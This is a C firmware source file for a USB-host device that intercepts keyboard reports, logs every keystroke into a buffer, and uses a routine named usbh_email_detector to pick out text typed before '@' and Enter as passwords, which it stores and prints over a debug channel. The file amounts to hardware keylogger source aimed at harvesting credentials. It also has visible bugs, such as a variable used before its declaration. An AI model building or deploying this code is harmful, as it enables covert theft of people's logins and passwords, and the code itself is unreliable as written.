//usbh.c

#include "hal.h"

#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"

#include "usb_hid_keys.h"
#include "usbh_custom_class_example.h"

#include "usbh/debug.h"
#include "usbh/dev/hid.h"
#include <string.h>

static char input_tab[NB_INPUT];
static int  input_index = 0;
static int  start_password_idx = 0;

char        password[NB_INPUT];
int         password_size;

//extern var
uint8_t    led_status = 7;

static THD_WORKING_AREA(waTestHID, 1024);

static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
{
    (void)len;
    uint8_t *report = (uint8_t *)hidp->config->report_buffer;

    //get every input in a tab
    rtt_printf("Key code: %02X\n", input);
    char input = hid2azerty(report);
    if(input) {
        input_tab[input_index] = input;
        usbh_email_detector(input);
        if(input_index++ >= 200)
            input_index = 0;
    }

    if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
        /* send the key on the computer */
        //usb_report(&UHD2, report, 8);
        if(report[2] == KEY_F2) {
            rtt_printf("=== INPUT ===");
            for(int i = 0; i < NB_INPUT; i++)
                rtt_printf("input[%d] = '%c'", i, input_tab[i]);
        }
    }
}

static USBH_DEFINE_BUFFER(uint8_t report[HAL_USBHHID_MAX_INSTANCES][8]);
static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];

static void ThreadTestHID(void *p)
{
    (void)p;
    uint8_t i;

    chRegSetThreadName("HID");

    for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
        hidcfg[i].cb_report     = _hid_report_callback;
        hidcfg[i].protocol      = USBHHID_PROTOCOL_BOOT;
        hidcfg[i].report_buffer = report[i];
        hidcfg[i].report_len    = 8;
    }

    for(;;) {
        for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
            if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_ACTIVE) {
                rtt_printf("HID: Connected, HID%d", i);
                usbhhidStart(&USBHHIDD[i], &hidcfg[i]);
                if(usbhhidGetType(&USBHHIDD[i]) != USBHHID_DEVTYPE_GENERIC) {
                    usbhhidSetIdle(&USBHHIDD[i], 0, 0);
                }
            } else if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_READY) {
                if(usbhhidGetType(&USBHHIDD[i]) == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
                    USBH_DEFINE_BUFFER(uint8_t val);
                    val = led_status;
                    usbhhidSetReport(&USBHHIDD[i], 0, USBHHID_REPORTTYPE_OUTPUT, &val, 1);
                }
            }
        }
        chThdSleepMilliseconds(200);
    }
}

/*
 * Initialisation of OTG FS port connected to a keyboard.
 */
void usbh_init(void)
{
    /*USBH_FS OTG*/
    palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DP, PAL_MODE_ALTERNATE(10));

    rtt_printf("Turn on USB power");
    palSetPad(GPIOB, GPIOA_OTG_FS_VBUS);
    chThdSleepMilliseconds(100);

    usbhStart(&USBHD1);
    chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
}

void usbh_email_detector(char input)
{
    if(password_size + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) { // avoid max password buffer
        rtt_printf("[WARNING] Password buffer full\n");
        return;
    }
    // check if current input is interesting
    switch(input) {
        case '@': // email is expected
            rtt_printf("@ detected\n");

            break;
        case '\n': // password is expected
            rtt_printf("[enter] detected\n");
            int len = input_index - start_password_idx;
            if(len > PASSWORD_MAX_SIZE)
                len = PASSWORD_MAX_SIZE;
            if(start_password_idx > input_index) { // buffer made a loop
                int bytes_written = NB_INPUT - start_password_idx;
                memcpy(password + password_size, input_tab + start_password_idx, bytes_written);
                memcpy(password + password_size + bytes_written, input_tab, len - bytes_written);
            }
            else
                memcpy(password + password_size, input_tab + start_password_idx, len);
            start_password_idx = input_index;
            password_size += len;
            // print password buffer
            password[password_size] = '\0';
            rtt_printf("password buffer: %s\n", password);
            break;
    }
}
